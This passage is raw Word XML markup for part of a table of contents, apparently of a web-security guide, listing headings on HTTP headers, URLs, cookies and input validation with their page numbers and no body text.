              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4CAFD875" w14:textId="501A833B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408532" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerabilities / Attacks Involving Headers</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408532 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="110FD673" w14:textId="5E285E37" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408533" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408533 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="27A2BA5E" w14:textId="6FBF19D0" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408534" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Uniform Resource Locator (URL)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408534 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="28D471A8" w14:textId="0042E5F6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408535" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Structure of URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408535 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7918F4C6" w14:textId="47428E61" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408536" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Components</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408536 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D73395A" w14:textId="0CA127E1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408537" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerabilities</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408537 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="586C216A" w14:textId="5F9905F3" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408538" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408538 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="474AB2AE" w14:textId="0EF350ED" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408539" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cookies</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408539 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="17B58884" w14:textId="3582A633" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408540" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How Cookies Work</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408540 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2A42F87C" w14:textId="4F62D84F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408541" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of Cookies</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408541 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6643804A" w14:textId="15C56B5B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408542" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cookie Attributes</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408542 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="469D8F84" w14:textId="0B81C2E8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408543" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerabilities &amp; Attacks</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408543 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2597A5BA" w14:textId="1CB1542F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408544" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408544 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="45BDA431" w14:textId="7D53B1CE" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408545" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Input Validation</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408545 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1750BA8E" w14:textId="3CE2C8B9" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408546" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How Input Validation Works</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408546 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0F118965" w14:textId="741298FC" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408547" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of Input Validation</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408547 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2ED096D3" w14:textId="468F5243" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408548" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Vulnerabilities</w:t>
            </w:r>
